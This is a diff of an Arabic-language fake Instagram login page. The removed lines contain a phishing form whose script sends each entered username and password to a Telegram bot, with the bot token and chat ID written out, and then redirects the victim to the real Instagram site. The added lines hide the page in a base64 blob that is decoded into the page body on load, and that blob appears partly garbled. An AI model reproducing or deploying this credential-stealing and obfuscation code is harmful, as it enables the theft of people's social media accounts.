@@ -4,130 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول - Instagram</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
-        }
-        .login-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 90%; /* تقليل العرض ليكون مناسبًا للشاشات الصغيرة */
-            max-width: 360px; /* تحديد عرض أقصى يناسب الهواتف */
-            text-align: center;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-        }
-        .login-container img {
-            width: 150px; /* تقليل حجم الشعار ليتناسب مع الهواتف */
-            margin-bottom: 20px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px 10px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            font-size: 16px;
-            text-align: right; /* محاذاة النصوص لليمين */
-        }
-        .login-options {
-            margin: 10px 0; /* المسافة بين الحقول */
-            text-align: center; /* محاذاة النصوص في الوسط */
-        }
-        .login-options a {
-            color: #3897f0;
-            text-decoration: none;
-            font-size: 16px; /* تكبير حجم النص */
-            position: relative;
-            left: -10px; /* تحريك النص إلى اليسار */
-        }
-        button {
-            width: 100%;
-            padding: 12px 0;
-            background-color: #3897f0;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px; /* المسافة بين الحقول وزر "تسجيل الدخول" */
-        }
-        button:hover {
-            background-color: #318ce7;
-        }
-        .facebook-login {
-            background-color: #3897f0; /* تغيير لون الخلفية ليتناسب مع لون تسجيل الدخول */
-            color: #fff;
-            font-weight: bold;
-            margin-top: 10px;
-            padding: 12px 0;
-            border-radius: 5px;
-            border: none;
-        }
-        .facebook-login span {
-            font-size: 16px; /* تغيير حجم النص ليكون أكبر قليلاً */
-        }
-        .footer {
-            margin-top: 30px; /* زيادة المسافة بين النصوص الأخرى و"أليس لديك حساب؟" */
-            font-size: 14px;
-            color: #8e8e8e;
-        }
-        .footer a {
-            color: #3897f0;
-            text-decoration: none;
-        }
-    </style>
+    <script>
+        // 
+        var encodedHTML = "PCFET0NUWVBFIEhUTUwgU0FNSCBsYW5nPSJhciI+PGhlYWQ+PHNldGNoIGNoYXJzZXQ9IlVUTFgtOCIgPjx0aXRsZT7a0dGDkza5U7X7P3nBq4ZT7a0bH7bsD65LMuHwcy7FdXx36EN6MxqeTDI6J9ANp1yAba6jAB1RAZES5kzdW0HLzXyEKQkvF16EAtakHMCvZhDhwg3sgH3mgqDg5iG4oQs8PCzK7BdqMdGVt7f2c4FFn2tddCwGMt17mFlJctD8gdjoCVEyG11MbETxEAyJPd3J6VE6Erz1C0b3guWoxSRKkc68bJ8rESFxZ20Wjb1XX1VYk97/XPSLo5HTaHsC6I2SIkMtMyw7bms3eAHRdtBCe0AzfSk7VIlL/tnECn0TQXjqlsWjVzw1U4zO+txQLRm8LNSmjWgk7aH2RIz9AoRfZj33BWXvHXB0tbRM2uNkkkl/rJN1wCMzjUV9WyCQ5v/xZCEyGl0ewfK8pxMo1Aeh9I6qaAHB60+eME9Jctgxlkwk6F6cKjdH4qMg4RjXplq2+KYF4AqF2K6TTJieppCmgm6h7d7G6ekKb8a7t9rmFqYoRzqkWSYw6ZySRfhtmJFrDhS9ofWqGJZwbMJfJWE99B8jFQ0FsOuvvOwxlCBA==";
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var decodedHTML = atob(encodedHTML);
+            document.body.innerHTML = decodedHTML;
+        });
+    </script>
 </head>
 <body>
-
-<div class="login-container">
-    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhicku6xeRp5E0bcPjckDvHKGyJ2ohsqfV1TgnZ0c1KeTY2AqxA12VZE4-LoKfQKnn96Pytn8Q2GrnMnEYQr13j51hi4Uad3ELXpxMCWQWaxE2O-GYo10VP1PkciyNrcYg0NDz3dI5Uos3zc3_f31sCJvXGfntXnULR0Ojs0BnIAJNwCsFa6A0sNEYWzLDQ/s183/inst.png" alt="Instagram Logo">
-    <button class="facebook-login">
-        <span>متابعة بحساب فيسبوك</span>
-    </button>
-    <div class="login-options">أو</div>
-    <form id="loginForm" method="POST">
-        <input type="hidden" name="chat_id" value="1900509620">
-        <input type="hidden" name="text" id="message">
-        <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
-        <input type="password" id="password" placeholder="كلمة السر" required>
-        <div class="login-options">
-            <a href="#">هل نسيت كلمة السر؟</a>
-        </div>
-        <button type="submit" onclick="sendTelegram(event)">تسجيل الدخول</button>
-    </form>
-    <div class="footer">   
-        أليس لديك حساب؟ <a href="#">تسجيل</a>
-    </div>
-</div>
-
-<script>
-    function sendTelegram(event) {
-        event.preventDefault();  // منع إرسال النموذج افتراضيًا
-
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-        var message = "Email: " + username + "\nPassword: " + password;
-
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
-
-        // إعادة التوجيه إلى موقع إنستجرام بعد الإرسال
-        xhr.onload = function() {
-            window.location.href = "https://www.instagram.com";
-        };
-    }
-</script>
-
 </body>
 </html>
